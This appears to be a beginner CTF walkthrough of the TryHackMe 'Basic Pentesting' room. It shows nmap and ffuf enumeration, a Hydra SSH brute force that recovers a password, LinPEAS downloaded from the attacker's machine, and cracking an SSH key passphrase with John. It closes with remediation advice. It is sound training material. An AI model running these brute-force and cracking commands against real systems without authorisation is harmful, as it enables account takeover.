# Basic Pentesting: THM â€” Complete Walkthrough

![](https://cdn-images-1.medium.com/max/2000/1*placeholder-hacking-image.png)

## Introduction

Welcome to my walkthrough of the **Basic Pentesting** room on TryHackMe! This machine is perfect for beginners looking to practice fundamental penetration testing techniques including web enumeration, credential brute-forcing, and privilege escalation.

**Difficulty:** Easy  
**Target IP:** 10.81.187.215  
**My IP:** [Your Kali IP]

Let's dive in! ğŸ”

---

## Reconnaissance

### Port Scanning with Nmap

As always, we start with reconnaissance. I ran an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -p- 10.81.187.215
```

**Discovered Ports:**
- **Port 22** â€” SSH
- **Port 80** â€” HTTP (Web Server)
- **Port 8080** â€” HTTP Alternate
- **Port 139** â€” NetBIOS
- **Port 445** â€” SMB

Multiple attack vectors available! Let's start with the web services.

---

## Web Enumeration

### Directory Fuzzing with FFUF

I used **ffuf** to fuzz for hidden directories on the web server:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.81.187.215/FUZZ
```

ğŸ¯ **Discovery:** A hidden directory called `/development` was found!

### Analyzing /development

Navigating to `http://10.81.187.215/development`, I found **two files**:

1. **dev.txt** â€” A message from J to K
2. **dev_notes.txt** â€” Additional notes

**Key Information Found:**
- Message mentioned a **password change**
- References to users **J** and **K**
- Potential usernames: **jan** and **kay**

This gave me valuable intelligence about potential user accounts!

---

## SMB Enumeration

### Using enum4linux

To confirm the usernames, I ran **enum4linux** against the SMB service:

```bash
enum4linux -a 10.81.187.215
```

âœ… **Confirmed Users:**
- **jan**
- **kay**

Perfect! Now I have valid usernames to target.

---

## Initial Access â€” SSH Brute Force

### Cracking SSH with Hydra

With valid usernames in hand, I used **Hydra** to brute-force SSH credentials for user `jan`:

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.81.187.215 -t 4
```

ğŸ”“ **Success!**  
**Username:** jan  
**Password:** armando

### SSH Login

```bash
ssh jan@10.81.187.215
```

I'm in! ğŸ‰

---

## Privilege Escalation

### Running LinPEAS

Once inside as `jan`, I uploaded and ran **LinPEAS** to look for privilege escalation vectors:

```bash
# On my machine
python3 -m http.server 8000

# On target
wget http://[MY_IP]:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Finding Kay's SSH Key

ğŸ” **LinPEAS Discovery:** Found an **SSH private key** (`id_rsa`) for user **kay**!

**Location:** `/home/kay/.ssh/id_rsa`

However, the key was **passphrase-protected**. Time to crack it!

---

## Cracking the SSH Key

### Using ssh2john + John the Ripper

First, I converted the SSH key to a format John can crack:

```bash
ssh2john kay_id_rsa > kay_hash.txt
```

Then, I used **John the Ripper** with the rockyou wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kay_hash.txt
```

âš¡ **Passphrase Cracked!**

### Logging in as Kay

```bash
ssh -i kay_id_rsa kay@10.81.187.215
# Enter the cracked passphrase
```

Successfully logged in as **kay**! ğŸ¯

---

## Finding Kay's Password

### Discovering pass.bak

While exploring Kay's home directory, I found a file called **pass.bak**:

```bash
cat ~/pass.bak
```

ğŸ“ **Kay's password backup file found!**

This file contained Kay's actual password, giving me full access to the account without needing the SSH key.

---

## Summary

### Attack Chain

1. **Reconnaissance** â†’ Nmap scan revealed multiple services
2. **Web Enumeration** â†’ FFUF discovered `/development` directory
3. **Information Gathering** â†’ Found usernames jan and kay
4. **SMB Enumeration** â†’ enum4linux confirmed users
5. **SSH Brute Force** â†’ Hydra cracked jan's password: `armando`
6. **Privilege Escalation** â†’ LinPEAS found kay's SSH key
7. **Key Cracking** â†’ ssh2john + john cracked the passphrase
8. **Full Access** â†’ Logged in as kay and found pass.bak

### Tools Used

- **nmap** â€” Port scanning
- **ffuf** â€” Directory fuzzing
- **enum4linux** â€” SMB enumeration
- **hydra** â€” SSH brute-forcing
- **LinPEAS** â€” Privilege escalation enumeration
- **ssh2john** â€” SSH key conversion
- **john** â€” Password cracking

### Key Takeaways

âœ… **Always enumerate web directories** â€” Hidden directories can leak sensitive information  
âœ… **User enumeration is critical** â€” Valid usernames make brute-force attacks much more effective  
âœ… **Automated tools are your friend** â€” LinPEAS saves hours of manual enumeration  
âœ… **Backup files are dangerous** â€” pass.bak exposed Kay's credentials  
âœ… **Defense:** Use strong passwords, disable password authentication for SSH, and never store passwords in plaintext

---

## Remediation Recommendations

**For System Administrators:**

1. **Remove sensitive files** from web-accessible directories
2. **Implement strong password policies** â€” Prevent common passwords
3. **Use SSH key authentication only** â€” Disable password-based SSH
4. **Apply principle of least privilege** â€” Users shouldn't access each other's home directories
5. **Never store plaintext passwords** â€” Use password managers
6. **Enable fail2ban** â€” Prevent brute-force attacks

---

## Conclusion

This was an excellent beginner-friendly machine that teaches fundamental penetration testing skills. The attack chain was logical and realistic, demonstrating how small information leaks can cascade into full system compromise.

Remember: **Security is only as strong as its weakest link.** ğŸ”’

**Happy Hacking! ğŸ‘¨â€ğŸ’»**

---

**Disclaimer:** This walkthrough is for educational purposes only. Only perform penetration testing on systems you own or have explicit permission to test.

#CyberSecurity #TryHackMe #PenetrationTesting #EthicalHacking #CTF #InfoSec #Linux #SSH
